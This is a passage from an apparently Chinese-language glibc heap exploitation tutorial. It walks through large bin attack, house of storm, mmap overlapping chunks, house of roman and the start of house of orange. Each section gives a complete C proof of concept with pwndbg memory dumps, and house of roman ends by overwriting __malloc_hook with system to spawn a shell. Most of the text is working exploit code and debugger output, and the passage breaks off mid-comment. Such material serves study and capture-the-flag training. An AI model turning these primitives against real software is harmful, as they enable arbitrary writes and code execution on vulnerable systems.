0x55555555b140Size: 0x20ec1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将<code>prve_size</code>改成该堆与<code>fake chunk</code>的<code>chunk header</code>地址的差</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x55555555b0400x55555555b040: 0xffffd5555555ce80      0x0000000000000100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>释放该堆再申请回来，此时申请的堆就在<code>fake_chunk</code>处</p><pre class="line-numbers language-none"><code class="language-none">Allocated chunkAddr: 0x7ffffffde010Size: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在释放一个属于<code>unsorted bin</code>的堆时会检测上一个堆是否被释放，若被释放则向上合并，且下一个堆是<code>top chunk</code>时直接合并到<code>top chunk</code>,所以<code>top chunk</code>地址就在<code>fake chunk</code>处，再次申请堆就可以从<code>fake chunk</code>开始申请</p><p>条件：</p><ul><li>可以篡改<code>prev_size</code> 与 <code>prve_inuse</code> </li><li>能够获取到要覆写的地址</li><li>能够在要覆写的地址伪造<code>fake chunk</code>，从而绕过 <code>unlink </code>的检测。</li></ul><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt; int main()&#123;    unsigned long stack_var1 &#x3D; 0;    unsigned long stack_var2 &#x3D; 0;    unsigned long *p1 &#x3D; malloc(0x420);    malloc(0x20);        unsigned long *p2 &#x3D; malloc(0x500);    malloc(0x20);    unsigned long *p3 &#x3D; malloc(0x500);    malloc(0x20);     free(p1);    free(p2);        malloc(0x90);    free(p3);    p2[-1] &#x3D; 0x3f1;    p2[0] &#x3D; 0;    p2[2] &#x3D; 0;    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);    malloc(0x90);     assert(stack_var1 !&#x3D; 0);    assert(stack_var2 !&#x3D; 0);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>向栈中写入数据，可用于修改<code>global_max_fast</code></li></ul><p>创建一个<code>large bin</code>之后再创建一个<code>fast bin</code>防止释放的时候合并掉</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405430Size: 0x31Top chunk | PREV_INUSEAddr: 0x405460Size: 0x20ba1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建两个大小相同且与大于第一个大小的<code>large bin</code>且每个<code>large bin</code>下面都创建一个<code>fast bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405430Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x405460Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x405970Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x4059a0Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x405eb0Size: 0x31Top chunk | PREV_INUSEAddr: 0x405ee0Size: 0x20121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第一、二两个堆释放进<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405460 —▸ 0x405000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个比第一个释放的堆小的堆使得<strong>第二个</strong>被释放的堆进入<code>large bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4050a0smallbinsemptylargebins0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第三个堆也释放到<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4059a0 —▸ 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4059a0smallbinsemptylargebins0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改第二个被释放的堆的一些内容</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4054600x405460:0x00000000000000000x00000000000003f1#减小第二个堆的大小使得第三个堆进入large bin链表0x405470:0x00000000000000000x00007fffffffdd50#将想要写入的栈地址写入bk、bk_nextsize,其中bk位置的地址要减0x10，bk_nextsize的地址要减0x200x405480:0x00000000000000000x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>fast bin</code>使得第三个堆进入<code>unsorted bin</code>，此时栈上的内容也会被修改为第三个堆的头指针</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405140 &#x2F;* &#39;@Q@&#39; *&#x2F;smallbinsemptylargebins0x500 [corrupted]FD: 0x405460 ◂— 0x0BK: 0x405460 —▸ 0x4059a0 —▸ 0x7fffffffdd50 ◂— 0x4059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;gx 0x7fffffffdd600x7fffffffdd60:0x00000000004059a0pwndbg&gt; x&#x2F;gx 0x7fffffffdd680x7fffffffdd68:0x00000000004059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x10];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);&#125;int get_shift_amount(char* pointer)&#123;        int shift_amount &#x3D; 0;        long long ptr &#x3D; (long long)pointer;        while(ptr &gt; 0x20)&#123;                ptr &#x3D; ptr &gt;&gt; 8;                shift_amount +&#x3D; 1;        &#125;        return shift_amount - 1; &#125;int main()&#123;init();char *unsorted_bin, *large_bin, *fake_chunk, *ptr;unsorted_bin &#x3D; malloc ( 0x4e8 ); malloc ( 0x18 ); int shift_amount &#x3D; get_shift_amount(unsorted_bin);        printf(&quot;Shift Amount: %d\n&quot;, shift_amount);        size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);        if(alloc_size &lt; 0x10)&#123;                printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);                puts(&quot;Chunk size is too small&quot;);                exit(1);        &#125;        alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10;         printf(&quot;In this case, the chunk size is 0x%lx\n&quot;, alloc_size);        if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;                puts(&quot;Allocation size has bit 4 of the size set or &quot;);                puts(&quot;mmap and non-main arena bit check will fail&quot;);                puts(&quot;Please try again! :)&quot;);                puts(&quot;Exiting...&quot;);                return 1;&#125;large_bin  &#x3D;  malloc ( 0x4d8 ); malloc ( 0x18 );free ( large_bin );  free ( unsorted_bin );unsorted_bin &#x3D; malloc(0x4e8);free(unsorted_bin);fake_chunk &#x3D; target - 0x10;((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; (( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ;ptr &#x3D; malloc(alloc_size);strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>条件：没有地址随机化</p><p>首先创建一个<code>unsorted bin</code>和一个<code>large bin</code>（<code>large bin</code>小于<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x291Allocated chunk | PREV_INUSEAddr: 0x405290Size: 0x4f1Allocated chunk | PREV_INUSEAddr: 0x405780Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x4057a0Size: 0x4e1Allocated chunk | PREV_INUSEAddr: 0x405c80Size: 0x21Top chunk | PREV_INUSEAddr: 0x405ca0Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放<code>large bin</code>和<code>unsroted bin</code>，再创建一个堆并释放掉使得<code>large bin</code>能够真正进入<code>large bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x291Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405290Size: 0x4f1fd: 0x7ffff7facbe0bk: 0x7ffff7facbe0Allocated chunkAddr: 0x405780Size: 0x20Free chunk (largebins) | PREV_INUSEAddr: 0x4057a0Size: 0x4e1fd: 0x7ffff7fad000bk: 0x7ffff7fad000fd_nextsize: 0x4057a0bk_nextsize: 0x4057a0Allocated chunkAddr: 0x405c80Size: 0x20Top chunk | PREV_INUSEAddr: 0x405ca0Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将<code>unsorted bin</code>的<code>bk</code>改成<code>目标地址 - 0x10</code></p><p>将<code>large bin</code>的<code>bk_nextsize</code>改成<code>目标地址 - 0x28 - shift amount</code>，<code>bk</code>改成<code>目标地址 - 0x8</code></p><p>其中，<code>shift amount</code>计算方式：<code>large bin</code>地址转换为长长整型，每次右移<code>8</code>位知道小于等于<code>0x20</code>，<code>shift amount</code>即为右移次数减<code>1</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x291Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405290Size: 0x4f1fd: 0x7ffff7facbe0bk: 0x404070Allocated chunkAddr: 0x405780Size: 0x20Free chunk (largebins) | PREV_INUSEAddr: 0x4057a0Size: 0x4e1fd: 0x7ffff7fad000bk: 0x404078fd_nextsize: 0x4057a0bk_nextsize: 0x404056Allocated chunkAddr: 0x405c80Size: 0x20Top chunk | PREV_INUSEAddr: 0x405ca0Size: 0x20361<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再申请出来就可以将目标地址改成一个随机的很大的数字了</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4040800x404080 &lt;target&gt;:0x00474645444342410x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;assert.h&gt;int main()&#123;int* ptr1 &#x3D; malloc(0x10); long long* top_ptr &#x3D; malloc(0x100000);long long* mmap_chunk_2 &#x3D; malloc(0x100000);long long* mmap_chunk_3 &#x3D; malloc(0x100000);    mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;    free(mmap_chunk_3); long long* overlapping_chunk &#x3D; malloc(0x300000);    int distance &#x3D; mmap_chunk_2 - overlapping_chunk;    overlapping_chunk[distance] &#x3D; 0x1122334455667788;assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对<code>mmap</code>的<code>overlap</code>，原理与<code>overlapping_chunks</code>相同，只是堆的大小在<code>mmap</code>创建的范围</p><p>首先创建了一个<code>0x10</code>的堆和三个<code>0x100000</code>的堆I（<code>heap</code>里看不到</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x405020Size: 0x411Top chunk | PREV_INUSEAddr: 0x405430Size: 0x20bd1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">The first mmap chunk goes directly above LibC: 0x7ffff7ef2010The second mmap chunk goes below LibC: 0x7ffff790c010The third mmap chunk goes below the second mmap chunk: 0x7ffff780b010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到第三个堆地址在第二个之上，所以将第三个堆大小改成二、三两个堆大小之和</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff780b0000x7ffff780b000:0x00000000000000000x00000000002020020x7ffff780b010:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>释放这个堆之后再申请出来(<code>0x300000</code>)</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7ffff770c0000x7ffff770c000:0x00000000000000000x00000000003010020x7ffff770c010:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>则第二个堆可用且第三个堆中第二个堆的部分也可用</p><h3 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE    #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;malloc.h&gt;#include &lt;dlfcn.h&gt;char* shell &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;;void* init()&#123;setvbuf(stdout, NULL, _IONBF, 0);setvbuf(stdin, NULL, _IONBF, 0);&#125;int main()&#123;init();uint8_t* fastbin_victim &#x3D; malloc(0x60); malloc(0x80);uint8_t* main_arena_use &#x3D; malloc(0x80);uint8_t* relative_offset_heap &#x3D; malloc(0x60);free(main_arena_use);uint8_t* fake_libc_chunk &#x3D; malloc(0x60);long long __malloc_hook &#x3D; ((long*)fake_libc_chunk)[0] - 0xe8;free(relative_offset_heap);free(fastbin_victim);fastbin_victim[0] &#x3D; 0x00;     long long __malloc_hook_adjust &#x3D; __malloc_hook - 0x23;     int8_t byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; int8_t byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; fake_libc_chunk[0] &#x3D; byte1;fake_libc_chunk[1] &#x3D; byte2;     malloc(0x60);malloc(0x60);uint8_t* malloc_hook_chunk &#x3D; malloc(0x60);uint8_t* unsorted_bin_ptr &#x3D; malloc(0x80);malloc(0x30);    free(unsorted_bin_ptr);__malloc_hook_adjust &#x3D; __malloc_hook - 0x10;byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; unsorted_bin_ptr[8] &#x3D; byte1;     unsorted_bin_ptr[9] &#x3D; byte2;     malloc(0x80); long long system_addr &#x3D; (long long)dlsym(RTLD_NEXT, &quot;system&quot;);malloc_hook_chunk[19] &#x3D; system_addr &amp; 0xff; malloc_hook_chunk[20] &#x3D; (system_addr &gt;&gt; 8) &amp; 0xff; malloc_hook_chunk[21] &#x3D; (system_addr &gt;&gt; 16) &amp; 0xff;malloc_hook_chunk[22] &#x3D; (system_addr &gt;&gt; 24) &amp; 0xff;     puts(&quot;Pop Shell!&quot;);malloc((long long)shell);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在没有<code>show</code>的情况下要将<code>malloc_hook</code>改成<code>ogg</code>需要通过<code>unsorted bin</code>使得<code>main arena</code>地址进入一个申请出来的堆的<code>fd</code>位置，然后让<code>fast bin</code>里的其他堆指向这个堆，并通过修改低位来改成<code>malloc_hook</code>,再利用<code>unsorted bin attack</code>改<code>malloc_hook</code>为<code>main arena</code>，最后改<code>fast bin</code>中的堆指向的堆为<code>ogg</code>即可将<code>malloc_hook</code>改成<code>ogg</code>，宗旨就是利用堆里的地址改低位为要修改的地址，需要注意<code>2.23</code>对<code>size</code>的检查</p></blockquote><p>先创建4个堆，大小分别为<code>0x60 0x80 0x80 0x60</code>,释放第三个堆进入<code>unsorted bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x71Allocated chunk | PREV_INUSEAddr: 0x405070Size: 0x91Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405100Size: 0x91fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x405190Size: 0x70Top chunk | PREV_INUSEAddr: 0x405200Size: 0x20e01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请比第三个堆小的第五个堆使得它从<code>unsorted bin</code>中切割并且<code>fd</code>中有<code>main arena</code>地址，由此得到<code>malloc_hook</code>地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x71Allocated chunk | PREV_INUSEAddr: 0x405070Size: 0x91Allocated chunk | PREV_INUSEAddr: 0x405100Size: 0x71Free chunk (unsortedbin) | PREV_INUSEAddr: 0x405170Size: 0x21fd: 0x7ffff7dd1b78bk: 0x7ffff7dd1b78Allocated chunkAddr: 0x405190Size: 0x70Top chunk | PREV_INUSEAddr: 0x405200Size: 0x20e01pwndbg&gt; x&#x2F;20gx 0x4051000x405100:0x00000000000000000x00000000000000710x405110:0x00007ffff7dd1bf80x00007ffff7dd1bf80x405120:0x00000000000000000x00000000000000000x405130:0x00000000000000000x00000000000000000x405140:0x00000000000000000x00000000000000000x405150:0x00000000000000000x00000000000000000x405160:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前后释放第四个堆和第一个堆，在<code>fast bin</code>中有第一个堆指向第四个堆，高地址便于修改为低地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x405000 —▸ 0x405190 ◂— 0x00x80: 0x0unsortedbinall: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第一个堆的<code>fd</code>改成第五个堆，即<code>unsorted bin</code>中切割出来的堆，而该堆指向了<code>main arena</code>,再通过相同的方式将第五个堆的<code>fd</code>改成<code>malloc_hook - 0x23</code>（绕过<code>size</code>检测）</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x405000 —▸ 0x405100 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea00000000x80: 0x0unsortedbinall: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;smallbinsemptylargebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来进行<code>unsorted bin attack</code>，创建大小为<code>0x80</code>的第六个堆，再创建一个堆来防止该堆与<code>top chunk</code>合并，释放第六个堆并把<code>bk</code>修改低位改成<code>malloc_hook - 0x10</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0xfff7a92ea00000000x80: 0x0unsortedbinall [corrupted]FD: 0x405200 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405200BK: 0x405200 —▸ 0x7ffff7dd1b00 (__memalign_hook) ◂— 0x0smallbins0x20: 0x405170 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这个堆申请出来，此时<code>malloc_hook</code>中的值就被改成了<code>main arena</code>，因为<code>main arena</code>的地址除了低位其他与<code>system</code>相同</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; p __malloc_hook$1 &#x3D; (void *(*)(size_t, const void *)) 0x7ffff7dd1b78 &lt;main_arena+88&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后通过<code>bin</code>里的堆改<code>malloc_hook</code>低位为<code>system</code>即可将<code>malloc_hook</code>改成<code>system</code></p><h3 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys&#x2F;syscall.h&gt;&#x2F;*  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer  It requires a leak of the heap and the libc  Credit: http:&#x2F;&#x2F;4ngelboy.blogspot.com&#x2F;2016&#x2F;10&#x2F;hitcon-ctf-qual-2016-house-of-orange.html*&#x2F;&#x2F;*   This function is just present to emulate the scenario where   the address of the function system is known.*&#x2F;int winner ( char *ptr);int main()&#123;    &#x2F;*      The House of Orange starts with the assumption that a buffer overflow exists on the heap      using which the Top (also called the Wilderness) chunk can be corrupted.            At the beginning of execution, the entire heap is part of the Top chunk.      The first allocations are usually pieces of the Top chunk that are broken off to service the request.      Thus, with every allocation, the Top chunks keeps getting smaller.      And in a situation where the size of the Top chunk is smaller than the requested value,      there are two possibilities:       1) Extend the Top chunk       2) Mmap a new page      If the size requested is smaller than 0x21000, then the former is followed.    *&#x2F;    char *p1, *p2;    size_t io_list_all, *top;    fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;        &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;);      fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;        &quot;https:&#x2F;&#x2F;sourceware.org&#x2F;git&#x2F;?p&#x3D;glibc.git;a&#x3D;commit;h&#x3D;db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;);    &#x2F;*      Firstly, lets allocate a chunk on the heap.    *&#x2F;    p1 &#x3D; malloc(0x400-16);    &#x2F;*       The heap is usually allocated with a top chunk of size 0x21000       Since we&#39;ve allocate a chunk of size 0x400 already,       what&#39;s left is 0x20c00 with the PREV_INUSE bit set &#x3D;&gt; 0x20c01.       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,       it must also be page aligned at the end.       Also, if a chunk that is adjacent to the Top chunk is to be freed,       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.       So that means that there are two conditions that must always be true.        1) Top chunk + size has to be page aligned        2) Top chunk&#39;s prev_inuse bit has to be set.       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.       What&#39;s left is 0x20c01       Now, let&#39;s satisfy the conditions       1) Top chunk + size has to be page aligned       2) Top chunk&#39;s prev_inuse bit has to be set.    *&#x2F;    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);    top[1] &#x3D; 0xc01;    &#x2F;*        Now we request a chunk of size larger than the size of the Top chunk.       Malloc tries to service this request by extending the Top chunk       This forces sysmalloc to be invoked.       In the usual scenario, the heap looks like the following          |------------|------------|------...----|          |    chunk   |    chunk   | Top  ...    |          |------------|------------|------...----|      heap start                              heap end       And the new area that gets allocated is contiguous to the old heap end.       So the new size of the Top chunk is the sum of the old size and the newly allocated size.       In order to keep track of this change in size, malloc uses a fencepost chunk,       which is basically a temporary chunk.       After the size of the Top chunk has been updated, this chunk gets freed.       In our scenario however, the heap looks like          |------------|------------|------..--|--...--|---------|          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |          |------------|------------|------..--|--...--|---------|     heap start                        